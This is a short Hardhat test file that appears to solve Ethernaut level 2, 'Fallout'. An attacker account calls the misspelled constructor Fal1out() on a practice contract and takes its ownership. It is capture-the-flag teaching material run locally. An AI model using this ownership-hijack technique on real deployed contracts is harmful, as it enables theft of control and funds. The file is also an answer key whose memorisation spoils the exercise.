import {expect} from 'chai';
import {ethers} from 'hardhat';
import {SignerWithAddress} from '@nomiclabs/hardhat-ethers/signers';
import {Fallout} from '../../types/typechain';

describe('Ethernaut 2: Fallout', () => {
  let owner: SignerWithAddress;
  let attacker: SignerWithAddress;

  let contract: Fallout;

  before(async () => {
    [owner, attacker] = await ethers.getSigners();
    contract = await ethers.getContractFactory('Fallout', owner).then(f => f.deploy());
    await contract.deployed();
  });

  it('should hijack ownership', async () => {
    // call the mistyped constructor :D
    await contract.connect(attacker).Fal1out();
  });

  after(async () => {
    expect(await contract.owner()).to.eq(attacker.address);
  });
});
